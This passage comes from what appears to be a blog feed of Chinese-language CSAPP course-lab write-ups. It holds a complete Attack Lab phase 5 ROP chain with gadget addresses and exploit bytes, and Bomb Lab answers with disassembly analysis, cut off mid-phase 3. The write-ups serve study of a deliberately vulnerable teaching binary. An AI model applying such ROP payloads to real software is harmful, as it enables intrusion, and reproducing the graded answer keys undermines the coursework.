\tretq\n</code></pre>\n<p>那么我们可以采取的方式是：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. 偏移量存储在栈上；popq %eax；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>但是现在问题来了，<code>%rax</code>既要存储偏移量，又要存储<code>%rsp</code>，我们能否换个地方存储<code>%rsp</code>呢，其实可以把第 2 步和第 3 步换一下，让<code>%rax</code>转储到<code>%rdi</code>里去就行。最终步骤如下：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n3. 偏移量存储在栈上；popq %eax；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>其中<code>gadget</code>的地址为：(单独的 gadget 地址见前文)</p>\n<ol>\n<li><code>rax = rsp</code> -&gt; <code>401a06</code></li>\n<li><code>rdi = rax</code> -&gt; <code>4019c5</code></li>\n<li><code>popq %eax</code> -&gt; <code>4019ab</code></li>\n<li>偏移量存储在栈上</li>\n<li><code>edx = eax</code> -&gt; <code>4019dd</code></li>\n<li><code>ecx = edx</code> -&gt; <code>401a69</code></li>\n<li><code>rsi = ecx</code> -&gt; <code>401a13</code></li>\n<li><code>rax = rdi + rsi</code> -&gt; <code>4019d6</code></li>\n<li><code>rdi = rax</code> -&gt; <code>4019c5</code></li>\n<li><code>touch3</code>地址 -&gt; <code>4018fa</code></li>\n</ol>\n<p>因为在执行第一条<code>rax = rsp</code>时，已经执行了一次<code>ret</code>指令，因此此时<code>%rsp</code>在<code>buf + 48</code>处，也就是返回地址已经被弹出了一个。所以在<code>buf + 48</code>后面是 9 个地址 + 数据，因此偏移量应该是 <code>9 * 8 = 72</code>，转化为 16 进制就是<code>0x48</code>。最终的栈结构如下：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/phase5-last.png\" alt=\"phase5-last.png\"></p>\n<p>因此，phase 5 的输入为：</p>\n<pre><code>00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n06 1a 40 00 00 00 00 00\nc5 19 40 00 00 00 00 00\nab 19 40 00 00 00 00 00\n48 00 00 00 00 00 00 00\ndd 19 40 00 00 00 00 00\n69 1a 40 00 00 00 00 00\n13 1a 40 00 00 00 00 00\nd6 19 40 00 00 00 00 00\nc5 19 40 00 00 00 00 00\nfa 18 40 00 00 00 00 00\n35 39 62 39 39 37 66 61\n00\n</code></pre>\n<p>最终结果如下：</p>\n<pre><code class=\"bash\">Cookie: 0x59b997fa\nType string:Touch3!: You called touch3(&quot;59b997fa&quot;)\nValid solution for level 3 with target rtarget\nPASS: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00\n</code></pre>\n<p>通过！</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ol>\n<li>phase 1 很简单，让 buffer overflow 溢出，然后覆盖返回地址即可</li>\n<li>phase 2 需要让<code>%rdi</code>的值等于<code>cookie</code>的值，我们需要插入一部分自己的攻击代码，比 Phase 1 难度稍微高点</li>\n<li>phase 3 中我们需要插入自己的攻击字符串，然后让<code>ret</code>指令返回到攻击代码开始处，通过指令将<code>%rdi</code>的值设置为攻击字符串的地址，并且把<code>touch3</code>的地址压到栈上。这里的难点在于<code>hexmatch</code>和<code>strncmp</code>中出现了<code>push</code>的压栈操作，并且使用了一段随机的 buffer，如果把攻击字符串放在攻击代码之前，会导致攻击字符串被破坏。因此这里的核心是把攻击字符串放在 caller 函数(<code>test</code>)的栈空间内（在返回地址下面），然后让<code>%rdi</code>指向这里</li>\n<li>phase 4 &amp; phase 5 的难点在于将过程理清楚，并且在<code>rtarget</code>中找到对应的<code>gadget</code>，将栈上作为<code>gadget</code>地址和数值的组合，巧妙地运用<code>popq</code>和<code>ret</code>和其他指令组合出我们想要的操作。</li>\n<li>phase 5 的核心在于首先确定<code>rax = rdi + rsi</code>，并且这两个寄存器一个存储<code>%rsp</code>，一个存储偏移量。要将数据输入到这两个寄存器，随后不断的通过反推，找到以他们为目标地址的指令通用结构，在<code>rtarget</code>中查找到相关指令，然后确定其源寄存器。再来反推什么指令能将数据输送到源寄存器。打通一条通路，然后确定每个 gadget 的地址，最后串联起来就是我们想要的 gadget 列表！这个过程收获很大！</li>\n</ol>\n<p>虽然做这 5 个 Phase 的过程不容易，但是总体来说受益匪浅！</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDcyNDk0OA==\">CSAPP 实验之 attack lab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NzYzOTY0NjU=\">CSAPP | Lab3-Attack Lab 深入解析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTA0MTgwNTM=\">csapp-attacklab 详解</span></li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "url": "https://salvely.github.io/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "title": "15213 Lab 2-Bomb lab 实验记录",
            "date_published": "2024-02-26T08:49:00.000Z",
            "content_html": "<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>我看见网上非常多的教程里面是一边使用<code>gdb</code>调试（过程中可能引爆炸弹），一边探索结果的。他们可能多次启动了<code>GDB</code>来完成实验。但是我在<code>bomb.c</code>中看到了如下指示:</p>\n<pre><code>No VICTIM may debug, reverse-engineer, run &quot;strings&quot; on, decompile, decrypt, or use any other technique to gain knowledge of and defuse the BOMB.\n</code></pre>\n<p>并且在 CSAPP 3e 的 handout 中也写的很清楚，不应该多次启动 gdb 来通过输入随机序列的方式来探测密码，毕竟解引的机会只有一次。如果引爆炸弹，autolab 的分数会掉。所以正确的方法应该是对汇编程序进行逆向分析，然后推算炸弹的密码，而不是通过多次输入字符串来利用炸弹进行测试。</p>\n<p>不要一开始就开<code>gdb</code>运行<code>phase</code>，可以先启动<code>gdb</code>，在<code>main</code>函数部分打断点，因为很多地方需要从<code>gdb</code>中获取信息，但是我们又不能直接开始做题，因为一做题就无法二次启动<code>gdb</code>了（会扣实验分）。最好是把每个<code>phase</code>都分析透彻，得出确定的答案了，再在<code>gdb</code>中运行，因为中间没有空闲给你打断点和运行，直接进入<code>gets</code>输入了。</p>\n<p>6 道题的答案为（如果用文件输入的话，记得最后有个换行符，否则炸弹爆炸）：</p>\n<pre><code>Border relations with Canada have never been better.\n1 2 4 8 16 32\n0 207\n0 0 DrEvil\nIONEFG\n4 3 2 1 6 5\n20\n</code></pre>\n<h2 id=\"题目浏览\"><a href=\"#题目浏览\" class=\"headerlink\" title=\"题目浏览\"></a>题目浏览</h2><p>首先我们使用<code>wget</code>命令从<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc2FwcC5jcy5jbXUuZWR1LzNlL2xhYnMuaHRtbA==\">实验官网</span>下载<code>tar</code>文件，使用<code>tar xvf bomb.tar</code>解压文件。</p>\n<p>打开文件夹，里面有 2 个重要文件，分别是<code>bomb.c</code>和<code>bomb</code>二进制文件。我们使用<code>objdump -d bomb &gt; bomb.s</code>生成二进制可执行文件的反汇编并存储在<code>bomb.s</code>中。<code>bomb.c</code>中只有<code>main</code>函数的部分，<code>main</code>函数调用的那些函数只在二进制文件和汇编代码中存在。</p>\n<p>我们首先来看<code>bomb.c</code>，其中含有 6 个 phase 的炸弹，我们需要依次解开。在函数最开始处作者声明可以有多种输入格式，可以从<code>stdin</code>获取输入，也可以从文件获取输入。每个 phase 都有如下两行：</p>\n<pre><code class=\"c\">phase_n(input);      /* Run the phase               */\nphase_defused();     /* Drat!  They figured it out!\n</code></pre>\n<h2 id=\"phase1-分析-基础读值\"><a href=\"#phase1-分析-基础读值\" class=\"headerlink\" title=\"phase1 分析: 基础读值\"></a>phase1 分析: 基础读值</h2><p><code>phase_1</code>的汇编代码如下：</p>\n<pre><code>0000000000400ee0 &lt;phase_1&gt;:\n  400ee0:\t48 83 ec 08          \tsub    $0x8,%rsp\n  400ee4:\tbe 00 24 40 00       \tmov    $0x402400,%esi\n  400ee9:\te8 4a 04 00 00       \tcallq  401338 &lt;strings_not_equal&gt;\n  400eee:\t85 c0                \ttest   %eax,%eax\n  400ef0:\t74 05                \tje     400ef7 &lt;phase_1+0x17&gt;\n  400ef2:\te8 43 05 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400ef7:\t48 83 c4 08          \tadd    $0x8,%rsp\n  400efb:\tc3                   \tretq\n</code></pre>\n<p>其过程如下：</p>\n<ol>\n<li>留出 8 个字节的空间</li>\n<li>让<code>%esi = 0x402400</code>，</li>\n<li>调用<code>strings_not_equal</code>函数</li>\n<li>测试<code>%eax</code>是否等于 0</li>\n<li>若返回值为 0，则恢复栈帧，退出</li>\n<li>否则引爆炸弹</li>\n</ol>\n<p>这里推测<code>%esi</code>是给<code>strings_not_equal</code>提供的参数，且<code>string_not_equal</code>返回的是个<code>int</code>类型整数。</p>\n<p>我们打开<code>gdb</code>，打好断点并运行，输入<code>call strings_not_equal(&quot;a&quot;,&quot;a&quot;)</code>发现返回 0。输入<code>call string_length(&quot;a&quot;)</code>发现返回 1。那么<code>strings_not_equal</code>的作用就是判断两字符串是否不相等，<code>string_length</code>的作用就是计算字符串的长度。</p>\n<p>我们的目的是让<code>strings_not_equal</code>返回 0，也就是说我们需要传入两个相同的字符串。那么问题在于我们传入的字符串存储在哪里呢？我们看一下<code>strings_not_equal</code>的反汇编代码：</p>\n<pre><code class=\"asm\">0000000000401338 &lt;strings_not_equal&gt;:\nseg1:\n  401338:\t41 54                \tpush   %r12\n  40133a:\t55                   \tpush   %rbp\n  40133b:\t53                   \tpush   %rbx\n  40133c:\t48 89 fb             \tmov    %rdi,%rbx\n  40133f:\t48 89 f5             \tmov    %rsi,%rbp\n  401342:\te8 d4 ff ff ff       \tcallq  40131b &lt;string_length&gt;\n  401347:\t41 89 c4             \tmov    %eax,%r12d\n  40134a:\t48 89 ef             \tmov    %rbp,%rdi\n  40134d:\te8 c9 ff ff ff       \tcallq  40131b &lt;string_length&gt;\n  401352:\tba 01 00 00 00       \tmov    $0x1,%edx\n\n  401357:\t41 39 c4             \tcmp    %eax,%r12d\n  40135a:\t75 3f                \tjne    40139b &lt;strings_not_equal+0x63&gt;\n  40135c:\t0f b6 03             \tmovzbl (%rbx),%eax\n\n  40135f:\t84 c0                \ttest   %al,%al\n  401361:\t74 25                \tje     401388 &lt;strings_not_equal+0x50&gt;\n\n  401363:\t3a 45 00             \tcmp    0x0(%rbp),%al\n  401366:\t74 0a                \tje     401372 &lt;strings_not_equal+0x3a&gt;\n  401368:\teb 25                \tjmp    40138f &lt;strings_not_equal+0x57&gt;\nseg2:\n  40136a:\t3a 45 00             \tcmp    0x0(%rbp),%al\n  40136d:\t0f 1f 00             \tnopl   (%rax)\n  401370:\t75 24                \tjne    401396 &lt;strings_not_equal+0x5e&gt;\nseg3:\n  401372:\t48 83 c3 01          \tadd    $0x1,%rbx\n  401376:\t48 83 c5 01          \tadd    $0x1,%rbp\n  40137a:\t0f b6 03             \tmovzbl (%rbx),%eax\n\n  40137d:\t84 c0                \ttest   %al,%al\n  40137f:\t75 e9                \tjne    40136a &lt;strings_not_equal+0x32&gt;\n  401381:\tba 00 00 00 00       \tmov    $0x0,%edx\n  401386:\teb 13                \tjmp    40139b &lt;strings_not_equal+0x63&gt;\nseg4:\n  401388:\tba 00 00 00 00       \tmov    $0x0,%edx\n  40138d:\teb 0c                \tjmp    40139b &lt;strings_not_equal+0x63&gt;\nseg5:\n  40138f:\tba 01 00 00 00       \tmov    $0x1,%edx\n  401394:\teb 05                \tjmp    40139b &lt;strings_not_equal+0x63&gt;\nseg6:\n  401396:\tba 01 00 00 00       \tmov    $0x1,%edx\nseg7:\n  40139b:\t89 d0                \tmov    %edx,%eax\n  40139d:\t5b                   \tpop    %rbx\n  40139e:\t5d                   \tpop    %rbp\n  40139f:\t41 5c                \tpop    %r12\n  4013a1:\tc3                   \tretq\n</code></pre>\n<p>其 C 语言代码分析如下：</p>\n<pre><code class=\"c\">seg2()\n&#123;\n    if(al != *rbp) &#123;\n        seg6();\n    &#125;\n    else&#123;\n        seg3();\n    &#125;\n&#125;\n\nseg3()\n&#123;\n    rbx += 1;\n    rbp += 1;\n    eax = *rbx;\n    if(al != 0) &#123;\n        // seg2\n        seg2();\n    &#125;\n    else &#123;\n        edx = 0;\n        seg7();\n    &#125;\n&#125;\n\nseg4()\n&#123;\n    edx = 0;\n    seg7();\n&#125;\n\nseg5()\n&#123;\n    edx = 1;\n    seg7();\n&#125;\n\nseg6() &#123;\n    edx = 1;\n    seg7();\n&#125;\n\nseg7()\n&#123;\n    eax = edx;\n    //还原rbx rbp r12\n    return eax;\n&#125;\n\n// 传入参数有 rdi rsi，返回值在eax中\nint strings_not_equal(char* str)\n&#123;\n    // seg1\n    // 保存r12 rbp rbx的值\n    rbx = rdi\n    rbp = rsi\n    call string_length\n    r12d = eax\n    rdi = rbp\n    call string_length\n    edx = 0x1;\n\n    if(r12d != eax) &#123;\n        seg7();\n    &#125;\n    else &#123;\n        eax = *rbx;\n        if(al == 0) &#123;\n            seg4();\n        &#125;\n        else &#123;\n            if(al == *rbp) &#123;\n                seg3();\n            &#125;\n            else &#123;\n                seg5();\n            &#125;\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<p>我们对调用的函数<code>string_length</code>反汇编看一下：</p>\n<pre><code>000000000040131b &lt;string_length&gt;:\n  40131b:\t80 3f 00             \tcmpb   $0x0,(%rdi)\n  40131e:\t74 12                \tje     401332 &lt;string_length+0x17&gt;\n  401320:\t48 89 fa             \tmov    %rdi,%rdx\n  401323:\t48 83 c2 01          \tadd    $0x1,%rdx\n  401327:\t89 d0                \tmov    %edx,%eax\n  401329:\t29 f8                \tsub    %edi,%eax\n  40132b:\t80 3a 00             \tcmpb   $0x0,(%rdx)\n  40132e:\t75 f3                \tjne    401323 &lt;string_length+0x8&gt;\n  401330:\tf3 c3                \trepz retq\n  401332:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401337:\tc3                   \tretq\n</code></pre>\n<p>其 C 语言转化如下：</p>\n<pre><code class=\"c\">// 传入参数为 rdi，推测其为字符串的首地址\nint string_length()\n&#123;\n    if(*rdi == 0x0) &#123;\n        rax = 0;\n        return rax;\n    &#125;\n    rdx = rdi;\n    do&#123;\n        rdx += 0x1;\n        eax = edx;\n        eax -= edi;\n    &#125;while(*rdx != 0x0);\n    return rax;\n&#125;\n</code></pre>\n<p>因为<code>string_length</code>中传入的应该是字符串首地址，存储在寄存器<code>%rdi</code>中。而<code>strings_not_equal</code>中我们使用了两个寄存器<code>%rdi</code>和<code>%rsi</code>，那么<code>%rsi</code>中保存的应该是第二个字符串的地址。而在<code>phase_1</code>中，我们让<code>%rsi = 0x402400</code>，也就是说<code>0x402400</code>这里有个字符串，我们要让输入的字符串和这里的字符串相同，才能让<code>%rax = 0</code>。</p>\n<p>输入<code>x/s 0x402400</code>，得到如下结果：</p>\n<pre><code>(gdb) x/s 0x402400\n0x402400:       &quot;Border relations with Canada have never been better.&quot;\n</code></pre>\n<p>这就是我们应该在<code>phase_1</code>中输入的字符串了！让我们来试试！结果如下：</p>\n<pre><code>(gdb)\nPhase 1 defused. How about the next one?\n81          printf(&quot;Phase 1 defused. How about the next one?\\n&quot;);\n</code></pre>\n<p>成功！现在准备解决<code>phase_2</code>的问题，<code>gdb</code>先不管。</p>\n<h2 id=\"phase2-分析-分支跳转-循环\"><a href=\"#phase2-分析-分支跳转-循环\" class=\"headerlink\" title=\"phase2 分析: 分支跳转 &amp; 循环\"></a>phase2 分析: 分支跳转 &amp; 循环</h2><p><code>phase_2</code>的反汇编如下：</p>\n<pre><code>0000000000400efc &lt;phase_2&gt;:\n  400efc:\t55                   \tpush   %rbp\n  400efd:\t53                   \tpush   %rbx\n  400efe:\t48 83 ec 28          \tsub    $0x28,%rsp\n  400f02:\t48 89 e6             \tmov    %rsp,%rsi\n  400f05:\te8 52 05 00 00       \tcallq  40145c &lt;read_six_numbers&gt;\n  400f0a:\t83 3c 24 01          \tcmpl   $0x1,(%rsp)\n  400f0e:\t74 20                \tje     400f30 &lt;phase_2+0x34&gt;\n  400f10:\te8 25 05 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400f15:\teb 19                \tjmp    400f30 &lt;phase_2+0x34&gt;\n\n  400f17:\t8b 43 fc             \tmov    -0x4(%rbx),%eax\n  400f1a:\t01 c0                \tadd    %eax,%eax\n  400f1c:\t39 03                \tcmp    %eax,(%rbx)\n  400f1e:\t74 05                \tje     400f25 &lt;phase_2+0x29&gt;\n  400f20:\te8 15 05 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400f25:\t48 83 c3 04          \tadd    $0x4,%rbx\n  400f29:\t48 39 eb             \tcmp    %rbp,%rbx\n  400f2c:\t75 e9                \tjne    400f17 &lt;phase_2+0x1b&gt;\n  400f2e:\teb 0c                \tjmp    400f3c &lt;phase_2+0x40&gt;\n\n  400f30:\t48 8d 5c 24 04       \tlea    0x4(%rsp),%rbx\n  400f35:\t48 8d 6c 24 18       \tlea    0x18(%rsp),%rbp\n  400f3a:\teb db                \tjmp    400f17 &lt;phase_2+0x1b&gt;\n\n  400f3c:\t48 83 c4 28          \tadd    $0x28,%rsp\n  400f40:\t5b                   \tpop    %rbx\n  400f41:\t5d                   \tpop    %rbp\n  400f42:\tc3                   \tretq\n</code></pre>\n<p>我们将其转化为 C 语言试试：</p>\n<pre><code class=\"c\">     // // 400f17\n     // eax = *(rbx - 0x4);\n     // eax *= 2;\n     // if(*rbx == eax) &#123;\n     //     rbx += 4;\n     //     if(rbx != rbp)\n     //         //400f17\n     //     else\n     //         //400f3c\n     //         //恢复栈空间和rbp rbx\n     //         return eax;\n     // &#125;else &#123;\n     //     call explode_bomb\n     // &#125;\nint phase_2()\n&#123;\n    //保存rbp rbx\n    //rsp留出40个字节\n    rsi = rsp;\n    call read_six_numbers\n    if(*rsp == 0x1) &#123;\n        // 400f30\n        rbx = rsp + 0x4;\n        rbp = rsp + 24;\n\n        // 400f17改写为循环\n        do &#123;\n            eax = *(rbx - 0x4);\n            eax *= 2;\n            if(*rbx != eax)\n                call explode_bomb\n            rbx += 4;\n        &#125;while(rbx != rbp)\n        return eax;\n    &#125;\n    else &#123;\n        call explode_bomb\n    &#125;\n&#125;\n</code></pre>\n<p>我们对<code>read_six_numebrs</code>反汇编一下看看：</p>\n<pre><code>000000000040145c &lt;read_six_numbers&gt;:\n  40145c:\t48 83 ec 18          \tsub    $0x18,%rsp\n  401460:\t48 89 f2             \tmov    %rsi,%rdx\n  401463:\t48 8d 4e 04          \tlea    0x4(%rsi),%rcx\n  401467:\t48 8d 46 14          \tlea    0x14(%rsi),%rax\n  40146b:\t48 89 44 24 08       \tmov    %rax,0x8(%rsp)\n  401470:\t48 8d 46 10          \tlea    0x10(%rsi),%rax\n  401474:\t48 89 04 24          \tmov    %rax,(%rsp)\n  401478:\t4c 8d 4e 0c          \tlea    0xc(%rsi),%r9\n  40147c:\t4c 8d 46 08          \tlea    0x8(%rsi),%r8\n  401480:\tbe c3 25 40 00       \tmov    $0x4025c3,%esi\n  401485:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  40148a:\te8 61 f7 ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  40148f:\t83 f8 05             \tcmp    $0x5,%eax\n  401492:\t7f 05                \tjg     401499 &lt;read_six_numbers+0x3d&gt;\n  401494:\te8 a1 ff ff ff       \tcallq  40143a &lt;explode_bomb&gt;\n  401499:\t48 83 c4 18          \tadd    $0x18,%rsp\n  40149d:\tc3                   \tretq\n</code></pre>\n<p>这里也有<code>explode_bomb</code>，有玄机啊~</p>\n<p>先分析<code>read_six_numbers</code>，这里就一个跳转，整个过程容易分析：</p>\n<pre><code>1. 保留 24 个字节的位置\n2. rdx = rsi\n3. rcx = rsi + 0x4\n4. rax = rsi + 20\n5. *(rsp + 8) = rax\n6. rax = rsi + 16\n7. *rsp = rax\n8. r9 = rsi + 12\n9. r8 = rsi + 8\n10. esi = 0x4025c3\n11. eax = 0\n12. call sccanf 获取输入\n13. if(eax &gt; 5) 恢复栈，返回 eax\n14. 否则爆炸\n</code></pre>\n<p>这里传入的应该只有一个参数，就是<code>%rsi</code>寄存器中的值，在前面<code>phase_2</code>里面<code>%rsi = %rsp</code>。那么输入的值应该是从<code>%rsp</code>开始存储。我们使用如下命令打印<code>0x4025c3</code>处的值，得到如下结果：</p>\n<pre><code>(gdb) x/s 0x4025c3\n0x4025c3:       &quot;%d %d %d %d %d %d&quot;\n</code></pre>\n<p>这里<code>%eax</code>中存储的应该是<code>sscanf</code>读入的数据个数，如果<code>%eax &gt; 5</code>的话，<code>read_six_numbers</code>顺利过关，否则爆炸。</p>\n<p>那么数组应该是保存在<code>%rsi</code>指向的位置（也就是一开始<code>%rsp</code>指向的位置），通过分析<code>phase_2</code>的代码，我们可以总结出以下要求：</p>\n<ol>\n<li>输入的第 1 个数必须是 1</li>\n<li>下一个数是前一个数的两倍</li>\n<li>输入 6 个数字，而且是整数，不是浮点数</li>\n</ol>\n<p>那么了解了要求后，我们需要输入<code>1 2 4 8 16 32</code>这 6 个数，看看结果：</p>\n<pre><code>(gdb)\nThat&#39;s number 2.  Keep going!\n88          printf(&quot;That&#39;s number 2.  Keep going!\\n&quot;);\n</code></pre>\n<p><code>phase_2</code>破解成功！我们继续<code>phase_3</code>！</p>\n<h2 id=\"phase3-分析：switch语句\"><a href=\"#phase3-分析：switch语句\" class=\"headerlink\" title=\"phase3 分析：switch语句\"></a>phase3 分析：<code>switch</code>语句</h2><p><code>phase_3</code>的反汇编代码如下：</p>\n<pre><code>0000000000400f43 &lt;phase_3&gt;:\n  400f43:\t48 83 ec 18          \tsub    $0x18,%rsp\n  400f47:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  400f4c:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  400f51:\tbe cf 25 40 00       \tmov    $0x4025cf,%esi\n  400f56:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400f5b:\te8 90 fc ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  400f60:\t83 f8 01             \tcmp    $0x1,%eax\n  400f63:\t7f 05                \tjg     400f6a &lt;phase_3+0x27&gt;\n  400f65:\te8 d0 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400f6a:\t83 7c 24 08 07       \tcmpl   $0x7,0x8(%rsp)\n  400f6f:\t77 3c                \tja     400fad &lt;phase_3+0x6a&gt;\n  400f71:\t8b 44 24 08          \tmov    0x8(%rsp),%eax\n  400f75:\tff 24 c5 70 24 40 00 \tjmpq   *0x402470(,%rax,8)\n  400f7c:\tb8 cf 00 00 00       \tmov    $0xcf,%eax\n  400f81:\teb 3b                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f83:\tb8 c3 02 00 00       \tmov    $0x2c3,%eax\n  400f88:\teb 34                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f8a:\tb8 00 01 00 00       \tmov    $0x100,%eax\n  400f8f:\teb 2d                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f91:\tb8 85 01 00 00       \tmov    $0x185,%eax\n  400f96:\teb 26                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f98:\tb8 ce 00 00 00       \tmov    $0xce,%eax\n  400f9d:\teb 1f                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f9f:\tb8 aa 02 00 00       \tmov    $0x2aa,%eax\n  400fa4:\teb 18                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fa6:\tb8 47 01 00 00       \tmov    $0x147,%eax\n  400fab:\teb 11                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n\n  400fad:\te8 88 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fb2:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400fb7:\teb 05                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fb9:\tb8 37 01 00 00       \tmov    $0x137,%eax\n\n  400fbe:\t3b 44 24 0c          \tcmp    0xc(%rsp),%eax\n  400fc2:\t74 05                \tje     400fc9 &lt;phase_3+0x86&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400fc9:\t48 83 c4 18          \tadd    $0x18,%rsp\n  400fcd:\tc3                   \tretq\n</code></pre>\n<p><del>这段代码较长，我们将其转化为 C 语言试试</del>：<br>我们先不转化成 C 语言，先来看一下让炸弹爆炸的几个条件。炸弹爆炸出现在如下几个地方：</p>\n<pre><code>  400f65:\te8 d0 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fad:\te8 88 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>对第一处，我们先进行分析：</p>\n<pre><code>  400f43:\t48 83 ec 18          \tsub    $0x18,%rsp\n  400f47:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  400f4c:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  400f51:\tbe cf 25 40 00       \tmov    $0x4025cf,%esi\n  400f56:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400f5b:\te8 90 fc ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  400f60:\t83 f8 01             \tcmp    $0x1,%eax\n  400f63:\t7f 05                \tjg     400f6a &lt;phase_3+0x27&gt;\n  400f65:\te8 d0 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>这段代码首先分配了 24 个字节的栈空间，随后做了如下步骤：</p>\n<ol>\n<li>rcx &#x3D; rsp + 12</li>\n<li>rdx &#x3D; rsp + 8</li>\n<li>esi &#x3D; 0x4025cf</li>\n<li>eax &#x3D; 0</li>\n<li>call sscanf</li>\n<li>将 eax 与 1 进行比较</li>\n<li>如果 eax &gt; 1，跳转到<code>400f6a</code></li>\n<li>否则炸弹爆炸</li>\n</ol>\n<p>这段代码和我们上一段看到的<code>sscanf</code>之前的代码非常相似，<code>0x4025cf</code>多半是一个让你输入一串东西的指令地址，我们看一下<code>%esi(0x4025cf)</code>附近的值等于多少：</p>\n<pre><code>(gdb) x/s 0x4025cf\n0x4025cf:       &quot;%d %d&quot;\n</code></pre>\n<p>这里说明我们需要输入 2 个数字，如果不是输入 2 个数字的话，炸弹就会爆炸。第一个要求明确了。</p>\n<p>再来看第二处炸弹的位置前后的代码，它的上一条代码是个<code>jmp</code>，那么就不可能从那儿执行到这儿来，因为炸弹爆炸了，所以他后面的代码也不可能执行，所以我们只需要看看哪些代码会跳转到这一条(<code>400fad</code>)上来。</p>\n<pre><code>  400f6a:\t83 7c 24 08 07       \tcmpl   $0x7,0x8(%rsp)\n  400f6f:\t77 3c                \tja     400fad &lt;phase_3+0x6a&gt;\n</code></pre>\n<p>这段代码出现在我们获取了两个整数之后。这段代码比较了<code>*(rsp + 8)</code>和<code>0x7</code>的值。为了不跳转到<code>400fad</code>，我们需要让<code>%rsp + 8 &lt;= 0x7</code>。第二个要求明确了。</p>\n<p>最后一个炸弹前的代码如下：</p>\n<pre><code>  400fb9:\tb8 37 01 00 00       \tmov    $0x137,%eax\n\n  400fbe:\t3b 44 24 0c          \tcmp    